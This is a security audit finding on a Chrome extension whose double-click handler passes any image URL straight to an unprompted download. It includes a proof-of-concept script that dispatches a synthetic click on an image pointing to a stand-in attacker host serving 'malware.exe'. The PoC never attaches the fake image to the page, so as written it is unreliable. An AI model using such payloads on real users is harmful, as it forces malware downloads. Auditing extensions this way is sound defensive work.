# CoCo Analysis: piheafhalbmhiaffagiaehdlnhgphcpd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (all variants of same vulnerability)

---

## Sink: document_eventListener_dblclick → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/piheafhalbmhiaffagiaehdlnhgphcpd/opgen_generated_files/cs_0.js
Line 467: document.addEventListener('dblclick', (event) => {
Line 469: if (event.target.tagName.toLowerCase() === 'img') {
Line 470: const imageUrl = event.target.src;

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/piheafhalbmhiaffagiaehdlnhgphcpd/opgen_generated_files/bg.js
Line 970: const filename = imageUrl.split('/').pop().split('?')[0];

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
document.addEventListener('dblclick', (event) => {
  // ← Attacker can dispatch synthetic dblclick event with crafted target
  if (event.target.tagName.toLowerCase() === 'img') {
    const imageUrl = event.target.src;  // ← Attacker-controlled via crafted image element

    // Send message to background with attacker-controlled URL
    chrome.runtime.sendMessage({ action: 'downloadImage', imageUrl });  // ← attacker-controlled
  }
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'downloadImage') {
    const imageUrl = message.imageUrl;  // ← Attacker-controlled URL

    const filename = imageUrl.split('/').pop().split('?')[0];

    // Download arbitrary file from attacker-controlled URL
    chrome.downloads.download({
      url: imageUrl,        // ← Attacker-controlled URL
      filename: filename,   // ← Derived from attacker-controlled URL
      saveAs: false
    });  // ← Download sink
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event manipulation - malicious webpage dispatches synthetic dblclick event

**Attack:**

```javascript
// Attacker creates a fake image element with malicious URL
const fakeImg = document.createElement('img');
fakeImg.src = 'https://attacker.com/malware.exe';  // Arbitrary malicious file

// Dispatch synthetic dblclick event on the fake image
const dblClickEvent = new MouseEvent('dblclick', {
  bubbles: true,
  cancelable: true,
  view: window
});

// Trigger the download
fakeImg.dispatchEvent(dblClickEvent);

// The extension will download malware.exe from attacker.com to user's machine
```

**Impact:** Arbitrary file download - malicious webpages can force the extension to download arbitrary files (including malware executables) from attacker-controlled URLs without user interaction beyond visiting the malicious page. The extension has "downloads" permission and runs on all URLs, making this vulnerability exploitable on any webpage.
